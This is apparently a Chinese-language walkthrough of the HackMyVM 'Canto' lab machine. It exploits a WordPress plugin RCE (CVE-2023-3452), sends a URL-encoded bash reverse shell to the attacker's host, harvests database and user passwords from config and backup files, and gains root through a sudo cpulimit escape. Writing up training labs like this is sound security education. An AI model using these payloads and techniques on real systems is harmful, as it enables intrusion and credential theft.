postData.contentHtml:
Canto.

https://hackmyvm.eu/machines/machine.php?vm=Canto

notes：Enjoy it!! ;)

前期踩点

➜  Canto nmap -sP 192.168.56.0/24

Web 渗透

信息收集

访问主页，使用 WordPress 构建的

使用 wpscan 进行针对性扫描

➜  Canto wpscan --url 192.168.56.61 --api-token bOauzGNYvhy6BU3DlHGCMVZmWJDqZH5tuFoHfsdk91o -e u,ap --plugins-detection mixed

 | Found By: Readme - Stable Tag (Aggressive Detection)

 | Confirmed By: Composer File (Aggressive Detection)
 |  - http://192.168.56.61/wp-content/plugins/canto/package.json, Match: ''3.0.4'

扫描出好几个漏洞，其中插件 Canto 存在 RCE 漏洞

Canto RCE - CVE-2023-3452

https://github.com/leoanggal1/CVE-2023-3452-PoC

进行反弹 shell

%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.56.4%2F1234+0%3E%261%27

提权 - To Erik

信息收集

查看配置文件 wp-config.php

/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' ); 
/** Database username */
define( 'DB_USER', 'wordpress' );
                                                    
/** Database password */           
define( 'DB_PASSWORD', '2NCVjoWVE9iwxPz' );

mysql 数据收集

www-data@canto:/var/www/html$ mysql -uwordpress -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 69
Server version: 8.0.36-0ubuntu0.23.10.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email     | user_url            | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+
|  1 | erik       | $P$BZk2jE4XrC91HKgRS83h0gICjM0bcB. | erik          | test@gmail.com | http://192.168.1.36 | 2024-05-12 11:16:07 |                     |           0 | erik         |
+----+------------+------------------------------------+---------------+----------------+---------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)

使用 John 进行爆破无果

在erik用户家目录能找到 notes 文件夹

www-data@canto:/home/erik/notes$ ls -al
total 16
drwxrwxr-x 2 erik erik     4096 May 12  2024 .
drwxr-xr-- 5 erik www-data 4096 May 12  2024 ..
-rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt
-rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt
www-data@canto:/home/erik/notes$ cat Day
cat: Day: No such file or directory
www-data@canto:/home/erik/notes$ cat Day1.txt 
On the first day I have updated some plugins and the website theme.
www-data@canto:/home/erik/notes$ cat Day2.txt 
I almost lost the database with my user so I created a backups folder.

寻找 backups 文件夹

www-data@canto:/home/erik$ find / -name backups 2>/dev/null
/snap/core22/1380/var/backups
/snap/core22/864/var/backups
/var/backups
/var/wordpress/backups

下面存在一个txt文件，里面是 erik 用户的密码

www-data@canto:/var/wordpress/backups$ cat 12052024.txt 
------------------------------------
| Users     |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |
------------------------------------

erik@canto:~$ cat user.txt 
d41d8cd98f00b204e9800998ecf8427e

提权 - To Root

查看 sudo 权限

erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit

https://gtfobins.github.io/gtfobins/cpulimit/

erik@canto:~$ sudo cpulimit -l 100 -f /bin/sh
Process 1300 detected
# id
uid=0(root) gid=0(root) groups=0(root)

# cat root.txt
1b56eefaab2c896e57c874a635b24b49
postData.title: HackMyVM - Canto
postData.description: Canto. https://hackmyvm.eu/machines/machine.php?vm=Canto notes：Enjoy it!! ;) 前期踩点 Web 渗透 信息收集 访问主页，使用 WordPress 构建的 使用 wpscan 进行针对性扫描 扫描出好几个漏洞，其中插件 Ca...
